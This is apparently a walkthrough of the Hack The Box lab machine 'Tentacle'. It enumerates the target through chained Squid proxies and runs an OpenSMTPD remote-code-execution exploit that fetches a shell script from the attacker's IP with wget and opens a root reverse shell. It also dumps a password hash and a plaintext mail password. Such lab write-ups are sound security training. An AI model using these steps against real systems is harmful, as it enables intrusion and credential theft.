@@ -1,0 +1,1240 @@
+Tentacle - Hack The Box - Linux Hard, No Web, All Network Enumeration, Proxy Chaining
+
+Linux KDC - Linux Domain Contoller
+
+Port 80 and 443 are not listening so we need sudo to do a ping on the box.
+
+Reason why ping works is because it has linux capabilities.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle/nmap]
+└──╼ $getcap $(which ping)
+/usr/bin/ping cap_net_raw=ep
+===================================================================================================================================
+
+Let's us send raw packets out the network driver, because of this permission set we can send these special packets as an unprivilged
+user.
+
+Like wise we could do setcap on nmap to give it those capabilities
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle/nmap]
+└──╼ $getcap $(which nmap)
+┌─[user@parrot-virtual]─[~/htb/tentacle/nmap]
+┌─[user@parrot-virtual]─[~/htb/tentacle/nmap]
+└──╼ $sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap
+[sudo] password for user: 
+┌─[user@parrot-virtual]─[~/htb/tentacle/nmap]
+└──╼ $getcap $(which nmap)
+/usr/bin/nmap cap_net_bind_service,cap_net_admin,cap_net_raw=eip
+===================================================================================================================================
+
+Nmap still fails, since it is not smart enough to check that these capabilities are enabled this can be done with the 
+'--privileged' flag
+We should now be able to run nmap without it not being able to find the box.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle/nmap/test]
+└──╼ $nmap --privileged -sVC -oA tentacle 10.10.10.224
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 12:39 PDT
+Nmap scan report for REALCORP.HTB (10.10.10.224)
+Host is up (0.13s latency).
+Not shown: 995 filtered ports
+PORT     STATE  SERVICE      VERSION
+22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
+|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
+|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
+53/tcp   closed domain
+88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-06-22 19:43:12Z)
+3128/tcp open   http-proxy   Squid http proxy 4.11
+|_http-server-header: squid/4.11
+|_http-title: ERROR: The requested URL could not be retrieved
+9090/tcp closed zeus-admin
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.24 seconds
+===================================================================================================================================
+
+You can create an alias so that executes it every time with the flag. Only good for one session we could edit our bashrc file to make
+the change permanent.
+
+We see port 53 dns running redhat linux, most probably centos, we have kerberos which is weird for alinux box.
+We can try a zone transfer but we have no domain name.
+
+We look at the squid server since that is our only lead at the moment. We can access this via our web browser.
+
+http://10.10.10.224:3128/
+
+We get the following text based on the web site output
+Commands and Output:
+===================================================================================================================================
+
+ERROR
+The requested URL could not be retrieved
+
+The following error was encountered while trying to retrieve the URL: /
+
+    Invalid URL
+
+Some aspect of the requested URL is incorrect.
+
+Some possible problems are:
+
+    Missing or incorrect access protocol (should be "http://" or similar)
+
+    Missing hostname
+
+    Illegal double-escape in the URL-Path
+
+    Illegal character in hostname; underscores are not allowed.
+
+Your cache administrator is j.nakazawa@realcorp.htb.
+
+Generated Tue, 22 Jun 2021 19:48:12 GMT by srv01.realcorp.htb (squid/4.11)
+===================================================================================================================================
+
+We appear to get a username and possible email and domain name
+"j.nakazawa@realcorp.htb"
+"srv01.realcorp.htb"
+
+We can now use nslookup 
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle/nmap]
+└──╼ $nslookup
+> server 10.10.10.224
+Default server: 10.10.10.224
+Address: 10.10.10.224#53
+> realcorp.htb
+Server:		10.10.10.224
+Address:	10.10.10.224#53
+
+*** Can't find realcorp.htb: No answer
+> srv01.realcorp.htb
+Server:		10.10.10.224
+Address:	10.10.10.224#53
+
+** server can't find srv01.realcorp.htb: NXDOMAIN
+===================================================================================================================================
+
+Next what we can do is use impacket's getNpusers script. Since we have a username.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle/nmap]
+└──╼ $impacket-GetNPUsers -no-pass realcorp.htb/j.nakazawa
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for j.nakazawa
+$krb5asrep$18$j.nakazawa@REALCORP.HTB:46ff56daf59ffda0a621497a9670adce$adb34e06d623846a6cc9a8c75f17d5acbd27894f1d29e48775db3db710258e1b4c24a338a95167b1ed1b50ebbe835cab13cfc48e11c6778d4210657b69008b315e4b118917c76c4a2f087c8c12c91636c46752226f10ca3f09f3c1df0606b41091dc89a354a07f49cb7e020cbea6d0257d6b34906a78d494d1bc94c2395ae14e392d124ac044e7b563e1aa4f074f5d2dfa153f8709819812b502581b45f2064adc26732f5cb2e525acaeb523c68edd3a4bf4bbaa6db4af060d526930f1868491d8c613e134729155de3cd51664caed7bff724e8b997b530f1039
+===================================================================================================================================
+
+However this ticket proves to be uncrackable. Hashcat does not have a mode in linux. Etype 18, only in windows which has etype23.
+Hashcat only supports NTLM.
+
+Squid most likely has no authentication.
+
+We have a domain so we can try a zone transfer
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $dig axfr realcorp.htb @10.10.10.224
+;; Connection to 10.10.10.224#53(10.10.10.224) for realcorp.htb failed: connection refused.
+===================================================================================================================================
+
+That fails, we could also use gobuster to brute force domain names.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $gobuster dns -d realcorp.htb -r 10.10.10.224 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster-dns.out
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Domain:     realcorp.htb
+[+] Threads:    10
+[+] Resolver:   10.10.10.224
+[+] Timeout:    1s
+[+] Wordlist:   /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+2021/06/22 14:40:47 Starting gobuster in DNS enumeration mode
+===============================================================
+Found: ns.realcorp.htb     
+..
+..
+..
+
+Found: proxy.realcorp.htb  
+Found: wpad.realcorp.htb
+===================================================================================================================================
+
+If we try nslookup with the newly found subdomain name we get the following back
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $nslookup 
+> server 10.10.10.224
+Default server: 10.10.10.224
+Address: 10.10.10.224#53
+> ns.realcorp.htb
+Server:		10.10.10.224
+Address:	10.10.10.224#53
+
+Name:	ns.realcorp.htb
+Address: 10.197.243.77
+
+===================================================================================================================================
+
+We also find a couple of other subdomain names.
+Commands and Output:
+===================================================================================================================================
+> proxy.realcorp.htb
+Server:		10.10.10.224
+Address:	10.10.10.224#53
+
+proxy.realcorp.htb	canonical name = ns.realcorp.htb.
+Name:	ns.realcorp.htb
+Address: 10.197.243.77
+> wpad.realcorp.htb
+Server:		10.10.10.224
+Address:	10.10.10.224#53
+
+Name:	wpad.realcorp.htb
+Address: 10.197.243.31
+===================================================================================================================================
+
+WPAD resolving to a different ip when queried. 
+We can now use squid, which is an http proxy to try and access wpad.
+We will use curl and a proxy param to try and reach the website if possible.
+
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $curl --proxy http://10.10.10.224:3128 http://10.197.243.31
+..
+..
+..
+
+<blockquote id="error">
+<p><b>Cache Access Denied.</b></p>
+</blockquote>
+
+<p>Sorry, you are not currently allowed to request http://10.197.243.31/ from this cache until you have authenticated yourself.</p>
+
+<p>Please contact the <a href="mailto:j.nakazawa@realcorp.htb?subject=CacheErrorInfo%20-%20ERR_CACHE_ACCESS_DENIED&amp;body=CacheHost%3A%20srv01.realcorp.htb%0D%0AErrPage%3A%20ERR_CACHE_ACCESS_DENIED%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Tue,%2022%20Jun%202021%2021%3A52%3A46%20GMT%0D%0A%0D%0AClientIP%3A%2010.10.14.28%0D%0A%0D%0AHTTP%20Request%3A%0D%0AGET%20%2F%20HTTP%2F1.1%0AUser-Agent%3A%20curl%2F7.74.0%0D%0AAccept%3A%20*%2F*%0D%0AProxy-Connection%3A%20Keep-Alive%0D%0AHost%3A%2010.197.243.31%0D%0A%0D%0A%0D%0A">cache administrator</a> if you have difficulties authenticating yourself.</p>
+
+..
+..
+..
+===================================================================================================================================
+
+We get the error message and and need to first authenticate ourselves.
+
+We can attempt to bypass this by first hitting the locahost on the local box
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $curl --proxy http://10.10.10.224:3128 http://127.0.0.1
+
+..
+..
+..
+
+<div id="content">
+<p>The following error was encountered while trying to retrieve the URL: <a href="http://127.0.0.1/">http://127.0.0.1/</a></p>
+
+<blockquote id="error">
+<p><b>Connection to 127.0.0.1 failed.</b></p>
+</blockquote>
+
+..
+..
+..
+===================================================================================================================================
+
+We get an invalid url. We will se command line flags and proxy chains.
+There is an acl that is preventing us from going into the the 10.197.243 network which was verified by the access denied.
+Meaning our network 10.10.14.0/24 is not allowed to hit 10.197.243.0/24
+
+We can try and proxy ourselves through squid. Using proxy chains
+We edit the /etc/proxychains.conf
+Commands and Output:
+===================================================================================================================================
+http 10.10.10.224 3128$
+http 127.0.0.1 3128$
+
+..
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $proxychains curl http://10.197.243.31
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<><>-10.197.243.31:80-<--denied
+curl: (7) Couldn't connect to server
+===================================================================================================================================
+
+We can see the way it travseress but can't connect to the server.
+
+We will now instead run nmap through proxychains using the two ips we found.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $sudo proxychains nmap -sT -Pn 10.197.243.77,31 -v -oA nmap/through-squid
+[sudo] password for user: 
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 15:06 PDT
+Initiating Parallel DNS resolution of 2 hosts. at 15:06
+Completed Parallel DNS resolution of 2 hosts. at 15:06, 0.04s elapsed
+Initiating Connect Scan at 15:06
+
+..
+..
+..
+
+Completed Connect Scan against 10.197.243.77 in 640.14s (1 host left)
+|S-chain|-<>-10.10.10.224:3128-<>-127.0.0.1:3128-<><>-10.197.243.31:6100-<--denied
+Completed Connect Scan at 15:17, 640.45s elapsed (2000 total ports)
+Nmap scan report for 10.197.243.31
+Host is up (0.31s latency).
+All 1000 scanned ports on 10.197.243.31 are closed
+
+Nmap scan report for 10.197.243.77
+Host is up (0.31s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+88/tcp   open  kerberos-sec
+464/tcp  open  kpasswd5
+749/tcp  open  kerberos-adm
+3128/tcp open  squid-http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 2 IP addresses (2 hosts up) scanned in 640.52 seconds
+
+===================================================================================================================================
+
+We come to find that the 10.197.243.77 ip has the same ports and services as the default machine on 10.10.10.224. 
+Our next step is to run a triple proxy using the 10.197.243.77 and see if we can get any output if we try and reach the 10.197.243.31
+IP on the network.
+Commands and Output:
+===================================================================================================================================
+sudo vim /etc/proxychains.conf
+..
+..
+..
+
+http 10.10.10.224 3128
+http 127.0.0.1 3128  
+http 10.197.243.77 3128
+
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $proxychains !!
+proxychains curl 10.197.243.31
+ProxyChains-3.1 (http://proxychains.sf.net)
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+    <head>
+        <title>Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux</title>
+..
+..
+..
+
+
+    <body>
+        <h1>Welcome to <strong>nginx</strong> on Red Hat Enterprise Linux!</h1>
+
+        <div class="content">
+            <p>This page is used to test the proper operation of the
+            <strong>nginx</strong> HTTP server after it has been
+            installed. If you can read this page, it means that the
+            web server installed at this site is working
+            properly.</p>
+
+            <div class="alert">
+                <h2>Website Administrator</h2>
+                <div class="content">
+                    <p>This is the default <tt>index.html</tt> page that
+                    is distributed with <strong>nginx</strong> on
+                    Red Hat Enterprise Linux.  It is located in
+                    <tt>/usr/share/nginx/html</tt>.</p>
+
+                    <p>You should now put your content in a location of
+                    your choice and edit the <tt>root</tt> configuration
+                    directive in the <strong>nginx</strong>
+                    configuration file
+                    <tt>/etc/nginx/nginx.conf</tt>.</p>
+
+                    <p>For information on Red Hat Enterprise Linux, please visit the <a href="http://www.redhat.com/">Red Hat, Inc. website</a>. The documentation for Red Hat Enterprise Linux is <a href="http://www.redhat.com/docs/manuals/enterprise/">available on the Red Hat, Inc. website</a>.</p>
+
+                </div>
+            </div>
+
+
+===================================================================================================================================
+
+Interestingly enough we now get a hit on a webserver after appending the other proxy to our proxychains.conf file.
+We now have access to the WPAD box. 
+Next thing to do is add the WPAD entry with it's corresponding IP to our hosts file so that virtual host routing can work and give 
+us a different web page.
+
+Next time we try to reach the webpage we get the following.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $proxychains curl http://wpad.realcorp.htb
+ProxyChains-3.1 (http://proxychains.sf.net)
+<html>
+<head><title>403 Forbidden</title></head>
+<body bgcolor="white">
+<center><h1>403 Forbidden</h1></center>
+<hr><center>nginx/1.14.1</center>
+</body>
+</html>
+===================================================================================================================================
+
+We can also try the wpad.dat entry, which is a comman file for web proxy Auto-Discovery and the file basically gives us instructions
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $proxychains curl http://wpad.realcorp.htb/wpad.dat
+ProxyChains-3.1 (http://proxychains.sf.net)
+function FindProxyForURL(url, host) {
+    if (dnsDomainIs(host, "realcorp.htb"))
+        return "DIRECT";
+    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
+        return "DIRECT"; 
+    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
+        return "DIRECT"; 
+ 
+    return "PROXY proxy.realcorp.htb:3128";
+}
+===================================================================================================================================
+
+If the dns name is realcorp.htb use the proxy. We see two subnets.
+
+We can do a recon on this new subnet. 
+We can dns lookups through dnsrecon.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $dnsrecon -r 10.197.243.0/24 -n 10.10.10.224 -d whatever
+[*] Reverse Look-up of a Range
+[*] Performing Reverse Lookup from 10.197.243.0 to 10.197.243.255
+[+] PTR wpad.realcorp.htb 10.197.243.31
+[+] PTR ns.realcorp.htb 10.197.243.77
+[+] 2 Records Found
+===================================================================================================================================
+
+What dnsrecon is basically doing is doing a nslookup for each ip in the subnet mask and grabbing any domain names that are outputed 
+'-d' flag can use any domain name, does not really matter.
+
+We can do this with the new subnet and see what domain name we get
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $dnsrecon -r 10.241.251.0/24 -n 10.10.10.224 -d whatever
+[*] Reverse Look-up of a Range
+[*] Performing Reverse Lookup from 10.241.251.0 to 10.241.251.255
+[+] PTR srvpod01.realcorp.htb 10.241.251.113
+[+] 1 Records Found
+===================================================================================================================================
+
+We found a domain with an IP which we can now use and focus on
+srvpod01.realcorp.htb 10.241.251.113
+
+We can now use nmap alongside proxychains to scan the machine.
+The machine is called since it uses podman which in redhat uses it instead of docker for containers.
+
+Used for systemd. More common things to use on redhat.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $sudo proxychains nmap -sT -Pn -n 10.241.251.113 -v -oA nmap/srvpod1 
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 16:47 PDT
+Initiating Connect Scan at 16:47
+Scanning 10.241.251.113 [1000 ports]
+Discovered open port 25/tcp on 10.241.251.113
+Connect Scan Timing: About 7.10% done; ETC: 16:54 (0:06:46 remaining)
+Connect Scan Timing: About 14.10% done; ETC: 16:54 (0:06:12 remaining)
+Connect Scan Timing: About 20.90% done; ETC: 16:54 (0:05:44 remaining)
+===================================================================================================================================
+
+We can see that smtp is enabled on the machine on the box. We can now specify are more narrow scan on the port and IP.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $sudo proxychains nmap -sT -Pn -n 10.241.251.113 -v -oA nmap/smtp -p 25 -sVC
+ProxyChains-3.1 (http://proxychains.sf.net)
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 16:50 PDT
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:50
+Completed NSE at 16:50, 0.00s elapsed
+Initiating NSE at 16:50
+Completed NSE at 16:50, 0.00s elapsed
+Initiating NSE at 16:50
+Completed NSE at 16:50, 0.00s elapsed
+Initiating Connect Scan at 16:50
+Scanning 10.241.251.113 [1 port]
+Discovered open port 25/tcp on 10.241.251.113
+Completed Connect Scan at 16:50, 0.40s elapsed (1 total ports)
+Initiating Service scan at 16:50
+Scanning 1 service on 10.241.251.113
+Completed Service scan at 16:50, 0.70s elapsed (1 service on 1 host)
+NSE: Script scanning 10.241.251.113.
+Initiating NSE at 16:50
+Completed NSE at 16:50, 2.18s elapsed
+Initiating NSE at 16:50
+Completed NSE at 16:50, 1.96s elapsed
+Initiating NSE at 16:50
+Completed NSE at 16:50, 0.00s elapsed
+Nmap scan report for 10.241.251.113
+Host is up (0.40s latency).
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    OpenSMTPD
+| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
+Service Info: Host: smtp.realcorp.htb
+
+NSE: Script Post-scanning.
+Initiating NSE at 16:50
+Completed NSE at 16:50, 0.00s elapsed
+Initiating NSE at 16:50
+Completed NSE at 16:50, 0.00s elapsed
+Initiating NSE at 16:50
+Completed NSE at 16:50, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5.57 seconds
+===================================================================================================================================
+
+If we glance at the smtpd version it is running on version 2.0.0 we can run a quick searchsploit and see if there are any potential
+vulnerabilities.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $searchsploit opensmtpd
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                | linux/remote/48038.rb
+OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                            | linux/local/48185.rb
+OpenSMTPD 6.4.0 < 6.6.1 - Local Privilege Escalation + Remote Code Execution                            | openbsd/remote/48051.pl
+OpenSMTPD 6.6.2 - Remote Code Execution                                                                 | linux/remote/47984.py
+OpenSMTPD 6.6.3 - Arbitrary File Read                                                                   | linux/remote/48139.c
+OpenSMTPD < 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                | openbsd/remote/48140.c
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+===================================================================================================================================
+
+Based on all the recon we can try and use one of the remote code execution scripts for example the python one since it is the
+easiest to modify and manipulate.
+
+Once we have downloaded and mirrored the file on our local directory we can modify the <root> to an actual email address in order
+for the exploit to work.
+
+Line 60 of the script is modified
+Commands and Output:
+===================================================================================================================================
+ 60 s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')$
+===================================================================================================================================
+
+We can now ruun the exploit by using prxoychains, we test it by using wget.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.14.28'
+ProxyChains-3.1 (http://proxychains.sf.net)
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $sudo nc -lnvp 80
+[sudo] password for user: 
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.224.
+Ncat: Connection from 10.10.10.224:39246.
+GET / HTTP/1.1
+User-Agent: Wget/1.20.1 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 10.10.14.28
+Connection: Keep-Alive
+===================================================================================================================================
+
+And we get a connect back.
+
+Apparently running the following causes issues due to bad characters
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $proxychains python3 47984.py 10.241.251.113 25 'wget http://10.10.14.28'
+===================================================================================================================================
+
+Best advice is to create a script that has reverse shell payload download it to disk and execute it to get a reverse shell back 
+without any of the nuisances.
+
+We first create a python http server and listen for requests
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $sudo proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.14.28/shell.sh -O /dev/shm/shell.sh'
+[sudo] password for user: 
+ProxyChains-3.1 (http://proxychains.sf.net)
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tentacle/www]
+└──╼ $sudo proxychains python3 -m http.server 80
+ProxyChains-3.1 (http://proxychains.sf.net)
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.224 - - [22/Jun/2021 17:17:26] "GET /shell.sh HTTP/1.1" 200 -
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $sudo proxychains python3 47984.py 10.241.251.113 25 'bash /dev/shm/shell.sh'
+ProxyChains-3.1 (http://proxychains.sf.net)
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+
+..
+..
+..
+
+
+┌─[user@parrot-virtual]─[~/htb/tentacle/www]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.224.
+Ncat: Connection from 10.10.10.224:53130.
+bash: cannot set terminal process group (24): Inappropriate ioctl for device
+bash: no job control in this shell
+root@smtp:~# whoami
+whoami
+root
+===================================================================================================================================
+
+TIDBIT:
+if you want python3 to run without sudo to access low ports for servers use the following setcap command.
+sudo setcap cap_net_bind_service+eip $(which python3.9)
+
+We now have a shell on the container with goal of further escalating to the actual box.
+
+We can find the type of linux box being used by specifying the following
+Commands and Output:
+===================================================================================================================================
+root@smtp:/etc# ls -la *rel*
+ls -la *rel*
+lrwxrwxrwx. 1 root root 21 Sep 19  2020 os-release -> ../usr/lib/os-release
+root@smtp:/etc# cat os-release
+cat os-release
+PRETTY_NAME="Debian GNU/Linux 10 (buster)"
+NAME="Debian GNU/Linux"
+VERSION_ID="10"
+VERSION="10 (buster)"
+VERSION_CODENAME=buster
+ID=debian
+HOME_URL="https://www.debian.org/"
+SUPPORT_URL="https://www.debian.org/support"
+BUG_REPORT_URL="https://bugs.debian.org/"
+===================================================================================================================================
+
+We are most likely dealing with a debian box. We will now run linPeas on the box.
+
+In order to get a pty terminal instead of using python we can use the script command to get a tty and be able to auto complete 
+commands.
+
+We can find out we are podman container after downloading and running linpeas.sh
+We also find sha-512 hash at the end of the linpeas.sh output.
+Commands and Output:
+===================================================================================================================================
+..
+..
+..
+
+╔══════════╣ Container details
+═╣ Is this a container? ........... podman═╣ Any running containers? ........ No
+
+..
+..
+..
+╔══════════╣ Searching specific hashes inside files - less false positives (limit 70)
+/etc/smtpd/creds:$6$EbpPCRMuO/Xwwv51$OVFV3eryJuJnk1vev7WX4JKgU6v8ND0zjXiI0CDMB0E4N6.bsp.2bpmNVUbYPRSIE95ex6dS92UbUAvcVdL.M/
+
+===================================================================================================================================
+
+We also find a password if we navigate to users home directory
+Commands and Output:
+===================================================================================================================================
+# cd j.nakazawa
+# ls
+# ls -la
+total 16
+drwxr-xr-x. 1 j.nakazawa j.nakazawa   59 Dec  9  2020 .
+drwxr-xr-x. 1 root       root         24 Dec  8  2020 ..
+lrwxrwxrwx. 1 root       root          9 Dec  9  2020 .bash_history -> /dev/null
+-rw-r--r--. 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout
+-rw-r--r--. 1 j.nakazawa j.nakazawa 3526 Apr 18  2019 .bashrc
+-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8  2020 .msmtprc
+-rw-r--r--. 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile
+lrwxrwxrwx. 1 root       root          9 Dec  9  2020 .viminfo -> /dev/null
+
+..
+..
+..
+# cat .msmtprc
+# Set default values for all following accounts.
+defaults
+auth           on
+tls            on
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile        /dev/null
+
+# RealCorp Mail
+account        realcorp
+host           127.0.0.1
+port           587
+from           j.nakazawa@realcorp.htb
+user           j.nakazawa
+password       sJB}RM>6Z~64_
+tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
+
+# Set a default account
+account default : realcorp
+===================================================================================================================================
+
+User: "j.nakazawa" Pass: "sJB}RM>6Z~64_"
+
+We find out that msmtp is an smtp client, which pretty much allows sendmail to auth to smtp.
+
+We can try to use the creds to login but that fails.
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $ssh j.nakazawa@10.10.10.224
+The authenticity of host '10.10.10.224 (10.10.10.224)' can't be established.
+ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.224' (ECDSA) to the list of known hosts.
+j.nakazawa@10.10.10.224's password: 
+===================================================================================================================================
+
+We instead we will focus on the kerberos portion, we will configure our box to use realcor.htb as a kerberos server.
+
+Will need to install a couple of binaries.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/tentacle]
+└──╼ $sudo apt install krb5-user
+===================================================================================================================================
+
+We make a backup of the conf file since we will edit it.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[/etc]
+└──╼ $sudo cp krb5.conf krb5.conf.bak
+
+..
+..
+..
+
+┌─[user@parrot-virtual]─[/etc]
+└──╼ $cat krb5.conf
+[libdefaults]
+	default_realm = REALCORP.HTB
+
+# The following krb5.conf variables are only for MIT Kerberos.
+	kdc_timesync = 1
+	ccache_type = 4
+	forwardable = true
+	proxiable = true
+
+# The following encryption type specification will be used by MIT Kerberos
+# if uncommented.  In general, the defaults in the MIT Kerberos code are
+# correct and overriding these specifications only serves to disable new
+# encryption types as they are added, creating interoperability problems.
+#
+# The only time when you might need to uncomment these lines and change
+# the enctypes is if you have local software that will break on ticket
+# caches containing ticket encryption types it doesn't know about (such as
+# old versions of Sun Java).
+
+#	default_tgs_enctypes = des3-hmac-sha1
+#	default_tkt_enctypes = des3-hmac-sha1
+#	permitted_enctypes = des3-hmac-sha1
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+	fcc-mit-ticketflags = true
+
+[realms]
+	REALCORP.HTB = {
+		kdc = srv01.realcorp.htb:88
+	}
+
+[domain_realm]
+	.realcorp.htb = REALCORP.HTB
+	realcorp.htb = REALCORP.HTB
+
+===================================================================================================================================
+
+The changes above are made on the conf file which we can now use, but since kerberos is a time senstitive protocol we have to
+make sure our time is in sync with the server.
+
+We will have to use ntp.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[/etc]
+└──╼ $sudo apt install ntpdate
+===================================================================================================================================
+
+With this we can now see by how much our time differs from the server.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[/etc]
+└──╼ $ntpdate -q 10.10.10.224
+server 10.10.10.224, stratum 10, offset +185.006526, delay 0.14169
+22 Jun 19:50:50 ntpdate[21267]: step time server 10.10.10.224 offset +185.006526 sec
+===================================================================================================================================
+
+In my case we are off by 185 seconds. We can try and sync the time with ntpdate
+Commands and Output:
+===================================================================================================================================
+└──╼ $date; sudo ntpdate 10.10.10.224; date
+Tue 22 Jun 19:52:57 PDT 2021
